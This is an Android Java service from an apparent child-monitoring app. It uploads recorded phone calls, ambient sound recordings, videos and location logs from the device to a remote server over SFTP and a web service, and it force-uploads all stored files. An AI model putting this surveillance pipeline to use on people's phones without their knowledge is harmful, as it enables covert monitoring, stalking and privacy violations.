package com.byteshaft.kidmonitor.services;

import android.app.IntentService;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;

import com.byteshaft.kidmonitor.AppGlobals;
import com.byteshaft.kidmonitor.constants.AppConstants;
import com.byteshaft.kidmonitor.database.MonitorDatabase;
import com.byteshaft.kidmonitor.utils.Helpers;
import com.byteshaft.kidmonitor.utils.SftpHelpers;
import com.byteshaft.kidmonitor.utils.WebServiceHelpers;

import org.json.JSONException;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;

public class UploadService extends IntentService {

    private static UploadService sInstance;
    private MonitorDatabase mDatabase;

    public UploadService() {
        super("UploadService");
        sInstance = this;
    }

    public static boolean isRunning() {
        return sInstance != null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        mDatabase = new MonitorDatabase(getApplicationContext());
        if (mDatabase.isEmpty()) {
            mDatabase.close();
            return;
        }

        if (isNetworkAvailable() && isInternetWorking()) {
            System.out.println("Internet working");
            ArrayList<HashMap> records = mDatabase.getAllRecords();
            for (HashMap map : records) {
                String type = (String) map.get("data_type");
                if (type.equals("location")) {
                    try {
                        boolean success = WebServiceHelpers.writeLocationLogs(
                                Helpers.getDeviceIdentifier(), (String) map.get("uri"), (String) map.get("time_stamp"));
                        if (success) {
                            mDatabase.deleteEntry(Integer.valueOf(map.get("unique_id").toString()));
                        }
                    } catch (IOException | JSONException e) {
                        e.printStackTrace();
                    }
                } else {
                    String uri = map.get("uri").toString();
                    File file = new File(uri);
                    if (file.exists()) {
                        SftpHelpers.upload(type, uri, Integer.valueOf(map.get("unique_id").toString()));
                    } else {
                        mDatabase.deleteEntry(Integer.valueOf(map.get("unique_id").toString()));

                    }

                }
            }
            // forced upload if database is not working or corrupted by any reason
            getFilesIfExistAndUpload();
        }
        mDatabase.close();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sInstance = null;
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnected();
    }

    private boolean isInternetWorking() {
        boolean success = false;
        try {
            URL url = new URL("https://google.com");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(10000);
            connection.connect();
            success = connection.getResponseCode() == 200;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return success;
    }

    public static void getFilesIfExistAndUpload() {
        String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
        String dataDirectory = sdcard + "/Android/data/";
        String storageDirectory = dataDirectory + AppGlobals.getContext().
                getPackageName() + File.separator;
        File filePath = new File(storageDirectory);
        File[] files = filePath.listFiles();
        ArrayList<String> arrayList = new ArrayList<>();
        if (files != null && files.length >= 0) {
            for (File file : files) {
                arrayList.add(file.toString());
            }

            if (!arrayList.isEmpty() && arrayList.size() >= 0) {
                for (String path : arrayList) {
                    File folderPath = new File(path);
                    File[] dataInsideFolder = folderPath.listFiles();
                    if (dataInsideFolder == null || dataInsideFolder.length == 0) {

                    } else if (folderPath.exists()) {
                        for (File data : dataInsideFolder) {
                            String currentFolder = folderPath.toString();
                            SftpHelpers.upload(getCurrentFolder(currentFolder), data.toString(), -1);
                        }

                    }
                }
            }

        }
    }

    private static String getCurrentFolder(String folder) {
        if (folder.endsWith(AppConstants.TYPE_SOUND_RECORDINGS)) {
            return AppConstants.TYPE_SOUND_RECORDINGS;
        } else if (folder.endsWith(AppConstants.TYPE_CALL_RECORDINGS)) {
            return AppConstants.TYPE_CALL_RECORDINGS;
        } else {
            return AppConstants.TYPE_VIDEO_RECORDINGS;
        }
    }

}
